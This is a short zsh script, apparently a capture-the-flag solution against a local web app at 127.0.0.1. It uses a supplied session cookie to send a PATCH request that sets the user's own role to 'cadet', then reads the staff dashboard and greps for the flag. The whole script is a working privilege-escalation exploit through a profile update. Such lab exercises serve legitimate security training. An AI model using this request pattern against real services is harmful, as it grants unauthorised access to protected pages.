#!/bin/zsh
# do a curl then a jq then a grep! damn!!! much fun!

((${+1})) || {
	echo "missing cookies!"
	exit 1
}

target='127.0.0.1:4942'

echo "Patching role"
curl -s -b "session=$1" \
	-X PATCH \
	-H 'Content-Type: application/json' \
	-d '{"role":"cadet"}' \
	http://$target/api/profile |
	jq . |
	grep --color=always -E '"role":.*'

echo "Retrieving flag"
curl -s http://$target/staff/dashboard -b "session=$1" |
	grep --color=always -E 'FLAG{.*}'
